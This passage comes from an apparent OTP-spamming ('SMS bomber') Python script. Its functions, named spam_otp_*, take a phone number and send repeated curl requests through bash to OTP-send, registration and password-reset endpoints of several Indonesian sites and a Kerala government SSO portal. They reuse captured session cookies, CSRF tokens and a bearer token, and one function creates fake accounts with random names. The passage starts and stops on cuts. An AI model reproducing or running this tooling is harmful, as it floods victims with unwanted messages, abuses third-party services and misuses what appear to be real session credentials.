  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://jec.co.id/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.3.755083444.1786010701; _gid=GA1.3.1346297291.1786010702; _fbp=fb.2.1786010702252.193345616220197204; _clck=40kett%5E2%5Eg8d%5E0%5E2409; moe_uuid=eed3e8e0-f7fb-43d9-b932-9dd06765b995; _clsk=1br6z3c%5E1786010704900%5E1%5E1%5Ez.clarity.ms%2Fcollect; _ga_VW5EHP2HBV=GS2.1.s1786010701$o1$g1$t1786010718$j43$l0$h0; _gcl_au=1.1.916045630.1786010701.-.-.1786010719.883151778.1786010719.1786010727; XSRF-TOKEN=eyJpdiI6Ii9kY0VzVUZNS09vTU5LWHlKNHA5SEE9PSIsInZhbHVlIjoiOWQ3R053U3ExVW80TjJlMXEzRVJIWDhoQnRjOU92TzJIVHNqU3ltWThZcDVQd1JKVi9Xeng1K0lHOGNvcHJsMHpGVEl0elI5YSt1SS93MWpWdVV6SDZjbTJES281ZlV6WGQybmIxQVEvMEpMTDdqNW83d3ZuTXN6czZTSDFoUy8iLCJtYWMiOiJhNWNjNDc1YTk2ZmUzZDVkZDQ0Y2E3OTUwMjU5NTJmMmI0ZjBhNzJhZDdiMGFhNmE2MDM1MzZhYTA3ZWFkZGU2IiwidGFnIjoiIn0%3D; jec_fe_production_session=eyJpdiI6ImVFMUZ5Wk00NXk1OXBEbHJobnhKenc9PSIsInZhbHVlIjoiRmU4ZUlQSWVxcjFDVXF3dkFIYWlyR290UlROZEVINFIvZ0ltWkYvcU1NcDVxVVQ3bVVwclhxTkMwSFg1d2Eyd1BCQ1d2YThUckt4QTJVdEhzNXl0UVZCbGdJTWpTck5wV2hBM2RlMzFIazZycjdsQVNpZ3pWYzFxd25McXJxL1QiLCJtYWMiOiIwNzBiMzY4NzQ2NTA3NmU2YjUxMThkOThhMGE2MGNhZmIwODM2YzBmMmU2NTI4ZWI2OWE3ZGNiNzgxYzUxYjU0IiwidGFnIjoiIn0%3D' \\
  --data-raw '_token={token}&loginparam=&rdr={rdr}&mobile={phone}&remember_me=1&tos=1&otp%5B%5D=&otp%5B%5D=&otp%5B%5D=&otp%5B%5D='"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False            

def spam_otp_generasimaju(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        import base64
        import random
        import string
        
        firstname = ''.join(random.choices(string.ascii_lowercase, k=8))
        password = base64.b64encode(f"{firstname}12345".encode()).decode()
        csrf_token = "1a6d98f9901ed40ce571b56fa1d47869841a4eda"
        auth_token = "8af3153c67f9b3faf620b64706e18c08"
        
        curl_cmd = f"""curl -s -X POST 'https://www.generasimaju.co.id/klub-generasi-maju/register' \\
  -H 'host: www.generasimaju.co.id' \\
  -H 'x-newrelic-id: UA4HUV5TARAEUFFVAQQEUFY=' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-csrf-token: {csrf_token}' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ4MDA4MDkiLCJhcCI6IjUzODc5NTE1MCIsImlkIjoiNWJkMTE5ZTZlODllM2RiOSIsInRyIjoiN2IxNWViZmIyNGU0OTljYmZlMDNlYTJjYmEzMmI1ODUiLCJ0aSI6MTc4NzEzNjk0MTkxNiwidGsiOiIzMzIzOTI1In19' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'traceparent: 00-7b15ebfb24e499cbfe03ea2cba32b585-5bd119e6e89e3db9-01' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'tracestate: 3323925@nr=0-1-4800809-538795150-5bd119e6e89e3db9----1787136941916' \\
  -H 'origin: https://www.generasimaju.co.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.generasimaju.co.id/klub-generasi-maju/register?referral=https://www.generasimaju.co.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: prev_page_url=/; data_layer_method=Website; TCPID=126831854422550661387; _gid=GA1.3.2087259638.1787136887; _gat_UA-103522697-4=1; _tt_enable_cookie=1; _ttp=01M0CTHJ7ZZ53RDS1MBZ8F9B69_.tt.2; _clck=1lemkln%5E2%5Eg8q%5E0%5E2422; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiJlOTUxYzg1NC0zYzQzLTQxMDYtYWFlYS1iYzY0N2I2NmVhODIifQ%3D%3D; _td_ssc_id=01M0CTHMEQHN4WM22AN96N2MD6; __stgeo=IjAi; __stbpnenable=MA%3D%3D; __stdf=MA%3D%3D; PHPSESSID=d7f6086225b836d265dc047dc6526a3b; _fbp=fb.2.1787136896361.715334083778519977; iDSP_Cookie=0abf53f9-e262-4b2b-8a4a-739b0d159f83**1787136896679*8e2f9123e95944449a39a9a80babf9e4*; _ga=GA1.3.1942976718.1787136886; _td=b724781d-c825-49e6-91e0-23b4e09740b8; __sts=eyJzaWQiOjE3ODcxMzY4ODgzNjksInR4IjoxNzg3MTM2ODk5MDUzLCJ1cmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkZrbHViLWdlbmVyYXNpLW1hanUlMkZyZWdpc3RlciUzRnJlZmVycmFsJTNEaHR0cHMlM0ElMkYlMkZ3d3cuZ2VuZXJhc2ltYWp1LmNvLmlkJTJGIiwicGV0IjoxNzg3MTM2ODk5MDUzLCJzZXQiOjE3ODcxMzY4ODgzNjksInBVcmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkYiLCJwUGV0IjoxNzg3MTM2ODg4MzY5LCJwVHgiOjE3ODcxMzY4ODgzNjl9; _clsk=1l4an9c%5E1787136899807%5E2%5E1%5Eu.clarity.ms%2Fcollect; ttcsid_C4RIGKH6H18A0MH113T0=1787136887112::rCra0ykXy8_h7KsBM04x.1.1787136940557.1; ttcsid=1787136887119::o07SA2cbudxtC_Hsy8Yh.1.1787136940557.0::1.5427.11326::53296.11.324.1008::52530.9.297; _ga_KHHX33L6LL=GS2.1.s1787136886$o1$g1$t1787136940$j6$l0$h0; _gcl_au=1.1.1934825587.1787136884.805340981.1787136911.1787136910.1774024647.1787136891.1787136940; AWSALB=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==; AWSALBCORS=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==' \\
  -H 'priority: u=1, i' \\
  --data-raw 'firstname={firstname}&msisdn={phone}&password={password}&mother_status=7&ispregnant=Y&pregnancyweek=1&isonpregnancyprogram=N&children_dob=&is_code_refferal_event_code=&refferal_code_event_code=&query_params%5B0%5D%5Breferral%5D=https%3A%2F%2Fwww.generasimaju.co.id%2F&auth_token={auth_token}&auth_token_prefix=registration'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('status') == 'success' or data.get('success'):
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                if data.get('result') and 'success' in str(data.get('result')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_norkaroots(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://sso.norkaroots.kerala.gov.in/send-whatsapp-otp' \\
  -H 'host: sso.norkaroots.kerala.gov.in' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-csrf-token: PFanayOE9IDJ6ecbyCBAgPXmasq0DOuTAmYDBbgU' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: */*' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'origin: https://sso.norkaroots.kerala.gov.in' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://sso.norkaroots.kerala.gov.in/register' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: XSRF-TOKEN=eyJpdiI6Ik9oc3lDS1R2ZzJCWjJDY25sQ1FVcVE9PSIsInZhbHVlIjoiWkRMWFhQUHlBNHFvUTF3TmoybC90MHZiRzE1ekN1RUtBUDYxTUpYT0FXalBoVnp2MFdOYldUaGFlY2lzSkNINFNmUGloTEdSMU9YUHY4M045TEFnREcyK2pNTk5manIvM1ZtRmc4Sk1vZ3FacE5mQmN5NXVlZVdXYVFtZ1BubWwiLCJtYWMiOiI4M2QzZjc5YzljNjVkZDJiNGQxOGRmY2RhMmUyMTQ1NTQ2YjQ4NTBiYmRmMjA1OGRlM2I3ZmNlYWM5ZGRmYTZjIiwidGFnIjoiIn0%3D; norka_roots_sso_portal_session=eyJpdiI6ImtxUG9GTXVtTXkxVWxra2NWSkhvR2c9PSIsInZhbHVlIjoiTnlKeEkyNUVKOXBha3pETDgySzBnNDg2STRYTXU3ZnNFemxabnIvZHBrVzFrNFloK05Ea2EzVzJOaGhsbWRXQlJNbWFKNi9ENzJZb1RvTUxGbzNNSjQ5Q0szVzZvZURTOG02VmZDakF4SDVRWEF5SDZPZkhoSzJxWWhKTU9oTGMiLCJtYWMiOiIwMjJiZjY5MWU4OTkxZjAxNzNkMzM3OWI1ODYwZWQwOWY0ZjllYWNkMTFkOTMzNDdmMDNlZWFmOTdkODM4MTI5IiwidGFnIjoiIn0%3D' \\
  -H 'priority: u=1, i' \\
  --data-raw 'whatsapp_number={phone}&whatsapp_country_code=62&whatsapp_country_iso_code=id'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_99co(nomor):
    try:
        if nomor.startswith('0'):
            phone = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            phone = '+62' + nomor
        elif nomor.startswith('+62'):
            phone = nomor
        else:
            phone = '+62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('62'):
            phone = '62' + phone
        
        phone = '+' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://www.99.co/id/api/biz/messaging/otp-events' \\
  -H 'host: www.99.co' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODcxNDg1MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiMGJiNTk2NmUtNWFjYS00NGJiLWExYTMtNjMzNGQ3MjlkMjEyIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjMyMDhhYmU0LTI1ZjctNDIwMi1hNzljLTdkYjQ3Mzk3YzFkZSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIiwiY29yZV91dWlkIjoiNTkxNzJkNjktODI1Ni00MWRlLWIxYTktZmFlYjQ4ODM1ZThlIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiJjYTE5YTJhZC1lMTlkLTQ3YTMtOGQwZS0yMzJhNjhiOGIyOTgiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJ0ZXN0aW1vbmkgYWFhYTgjODMiLCJjb3JlX2N1c3RvbWVyX3V1aWQiOiIyNjZlYzAzYS1iZTczLTQzZWQtODEyNi02NDZjMzc2MjkxYmYiLCJlbWFpbCI6InRlc3RpbW9vb3Nra2RqczE5bWlAZ21haWwuY29tIn0.VqqVrTIAPNKv9dCTEvXfRjopfv2Pp2q1vviklB2kqMHuCSmVoYfA1OqrZF6W8qEo5cVL6joSsxTplMqHM6Da-w' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'baggage: sentry-environment=production,sentry-release=c928e07fcd93cfdde3580c19dc671d781ef22fa0,sentry-public_key=a05fe8bc05a068bbf916024d2d1e9ed2,sentry-trace_id=ab490fa074854059a800588a8f67ff14,sentry-org_id=396133,sentry-transaction=%2F,sentry-sampled=false,sentry-sample_rand=0.5645084361255753,sentry-sample_rate=0' \\
  -H 'sentry-trace: ab490fa074854059a800588a8f67ff14-ae1ab7e4072b3ec5-0' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'content-type: application/json' \\
  -H 'origin: https://www.99.co' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.99.co/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _99-acs-token=eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODcxNDg1MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiMGJiNTk2NmUtNWFjYS00NGJiLWExYTMtNjMzNGQ3MjlkMjEyIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjMyMDhhYmU0LTI1ZjctNDIwMi1hNzljLTdkYjQ3Mzk3YzFkZSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIiwiY29yZV91dWlkIjoiNTkxNzJkNjktODI1Ni00MWRlLWIxYTktZmFlYjQ4ODM1ZThlIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiJjYTE5YTJhZC1lMTlkLTQ3YTMtOGQwZS0yMzJhNjhiOGIyOTgiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJ0ZXN0aW1vbmkgYWFhYTgjODMiLCJjb3JlX2N1c3RvbWVyX3V1aWQiOiIyNjZlYzAzYS1iZTczLTQzZWQtODEyNi02NDZjMzc2MjkxYmYiLCJlbWFpbCI6InRlc3RpbW9vb3Nra2RqczE5bWlAZ21haWwuY29tIn0.VqqVrTIAPNKv9dCTEvXfRjopfv2Pp2q1vviklB2kqMHuCSmVoYfA1OqrZF6W8qEo5cVL6joSsxTplMqHM6Da-w; _99-ref-token=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI0MjllZjYyYy03NDU4LTRhMDQtOTNlNC1mMDJjYWNiZjY4NTcifQ.eyJleHAiOjE3ODc3NDk3MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiZjI3OTlmYjktYTQ5ZC00MjY4LTk3MzEtMDE1NTExNWE2ODUxIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwiYXVkIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiUmVmcmVzaCIsImF6cCI6ImZyb250ZW5kLWFwcCIsInNlc3Npb25fc3RhdGUiOiIzMjA4YWJlNC0yNWY3LTQyMDItYTc5Yy03ZGI0NzM5N2MxZGUiLCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIn0.40VVHypaU2lxlcNif3cyNKNQ6NqCESpC9F6gpa4R4TA; country=ID; _fbp=fb.1.1783634838553.530234959419040031; __cf_bm=mHd7ebZZvr9QC4g39gJRTX7n8RbxTABa2vptnPN2jnY-1787144797.8016622-1.0.1.1-XuJ5D0MeHxyWcNU8ijk.OhbYJMH9JyHuoOPWG8NxQlnURKBzM92HhOPEnC22T6gv1lGsn.Q94dkbDfxAh0obTw30tgNFaVAYsKCcoHDul_e5o4iQ3AdY4oQVdsRmqus9; NEXT_LOCALE=en; nid=1468adb9-ef60-4b93-80f8-67f6d905429b; ajs_anonymous_id=1468adb9-ef60-4b93-80f8-67f6d905429b; WZRK_G=c5063a1d88cc4d57b481ff69e6271672; WZRK_S_6Z6-5Z4-R56Z=%7B%22p%22%3A1%2C%22s%22%3A1787144803%2C%22t%22%3A1787144805%7D; dbb_rum=%7B%22date%22%3A1787144796651%2C%22id%22%3A%22mt03vai3tjl67ja56e.i%22%2C%22hnc%22%3A1%2C%22nc%22%3A1%2C%22conv%22%3A%5B%5D%2C%22sample%22%3Afalse%7D; g_state={"i_l":0,"i_ll":1787144808996,"i_b":"4d9tCoq6T065IxLpbI3/B9pCnohc4rpf66c/WYlUFiM","i_e":{"enable_itp_optimization":24},"i_et":1787144808996}; _xsrf=2|c7bf88e2|2ee5e97e7c0d5421580d7ed032370b4e|1787144810; _gcl_au=1.1.642346103.1783634927; _gid=GA1.2.998693239.1787144812; _ga_6C5VMQ1JNP=GS2.1.s1787144812$o1$g0$t1787144813$j59$l0$h0; _ga_GG21BH9GS5=GS2.1.s1787144813$o1$g0$t1787144813$j60$l0$h0; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22unknown%22%2C%22expiryDate%22%3A%222027-08-19T13%3A06%3A54.597Z%22%7D; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22GAhcAYFrDoxEYfSp94nX%22%2C%22expiryDate%22%3A%222027-08-19T13%3A06%3A54.600Z%22%7D; _ga_9FDXXVZSH0=GS2.1.s1787144814$o1$g0$t1787144814$j60$l0$h0; meid=ddb8aaf2-e634-40d3-bdde-198c0d309838; intercom-id-e90pxaa2=a14209fa-dc61-4abe-94cc-e50af422bdd5; intercom-session-e90pxaa2=; intercom-device-id-e90pxaa2=154bdeab-bd24-418e-b61a-3d77de4e79b9; _ga_ZJWD7VVPHG=GS2.2.s1787144822$o2$g0$t1787144822$j60$l0$h0; _ga=GA1.1.1461816152.1783634837; cto_bundle=RcS8X19sbFllSDZ6eG1VcEtESVM0ZDglMkJycFA1RlFIRGg4WGxyS01OcUV3MjdYVlZtdlhrcUglMkJ1c2J6MXN6UTVHVjR0Mnc5ZHkzZDdzOVVRcVVTOVlKUXlTUTZXV3BDeVZ6UXNmbzZhc0tBS1ElMkIxUzclMkJSYUx2NzZ2UDU3OURyY0lhc0tiaFc2JTJCa0dHRWlFSm1meWhMakZtMEJRJTNEJTNE; _ga_Q823T54LSF=GS2.1.s1787144823$o2$g1$t1787144905$j38$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"brand":"99id","destination_address":"{phone}","type_id":2}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_bunda_cms(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://cms.bunda.co.id/api/v1/auth/send-otp' \\
  -H 'host: cms.bunda.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-firebase-appcheck: eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjU5NjU2Mzg5ODEwMzp3ZWI6Y2VmNTMwYWNmYjgzZGY4NDdhZWRmMiIsImF1ZCI6WyJwcm9qZWN0cy81OTY1NjM4OTgxMDMiLCJwcm9qZWN0cy9ibWhzLXdlYi1hcHBzIl0sInByb3ZpZGVyIjoicmVjYXB0Y2hhX3YzIiwiaXNzIjoiaHR0cHM6Ly9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tLzU5NjU2Mzg5ODEwMyIsImV4cCI6MTc4NzIzNzQ1MCwiaWF0IjoxNzg3MTUxMDUwLCJqdGkiOiJ4YUEydzFUWnpxVHgtU2NHOGVQUGRqRkV3OHRVWUZhdXhfa3ExckthNVpBIn0.0GtUrReLPvBzyUZSeojw_D4CQfRcIhYS4kwTpuwMmbpQ8VquBJUyaEcSl28Rpq0_LrEcRkz-nHrAHtD2V-trDLQYzXIq2rC-JYWm3YadIDgh3FQ_nWrzdUUHfDLwCpgUU0QdopTXt1IkqEVK29vHjndK-s4yADZtVkV61DNzUKQKqCwcEH2Imw9q7GFEo19EhIYLIVd06Zdvit_GnPr93zYtuwzuIMPXcOghmqzsgER0vec2JQAr7oIc7Za47y_MNhtfJ5duSoDDb0MzyHaMJ0xX_-s6WIWT8gUI2uCwW2asUALRSouydvlOgMGpBkcZHAThBLYJ3k11iNEUUV-nwVb15PUjLM6y3XRHWXwEZ_1WAVy3GDFk-mxnGY8ez2X1xX64JJSVJMMqbwl_V0XccWPtlYEBP3MvmpgVl33lF6Pb9ZMaVAVv2C2h_8V6ik0rhsequDyDgd1as20UUagHfZEUIJCiMhktSc2yykuoGiXVTasq5dROxcQgEwPYN66x' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'content-type: application/json' \\
  -H 'x-locale: id' \\
  -H 'origin: https://www.bunda.co.id' \\
  -H 'sec-fetch-site: same-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.bunda.co.id/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{{"phone_number":{phone},"type":"auth"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_bukuaku(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://bukuaku.id/base/forgot_password' \\
  -H 'host: bukuaku.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://bukuaku.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://bukuaku.id/id/login/forgot-password' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: auth.strategy=local; cf_clearance=XqnbImZU1JDSaShhb_lmYSpQqKmmCO9LXzhupeLjb4Q-1787472072-1.2.1.1-QHXLCp4nn93kWxK329lkkBmufK61MrozGvisAi5I63FFG9hOuxAma36dmo1zR_6WDUUGtMKeWjunD.ZVtfBH2naodVEMlOIAbS1gr7UfK5rIGFZOOeoReHAxz_6JUcOZibiR1Eyi64cokdS0l0d2qSoclc86B8J.BNNgGDAE_nGxci1_vsnCw5sfFeWtB5khVDMOks7FA7CEJ_pVcX9gyk53ovGK.8Z7uUlgYm9iS_zebMc4pprAjKdDrueY5Zy12Pky.BIJQJFYqtdechKNkk4bXrch1XONusumwCGokSdr7cmalMeSZXeLgMOq4Ddv8jl5G.ybxcHwECWUY3kr_303wQpLvS7TE9p0PT.Xej0; _gcl_au=1.1.984154179.1787472072; _ga=GA1.1.250152120.1787472073; _ga_9KQFL3Q499=GS2.1.s1787472072$o1$g1$t1787472585$j60$l0$h0; _ga_GN7DGX69XZ=GS2.1.s1787472073$o1$g1$t1787472586$j59$l0$h0' \\
  -H 'priority: u=1, i' \\
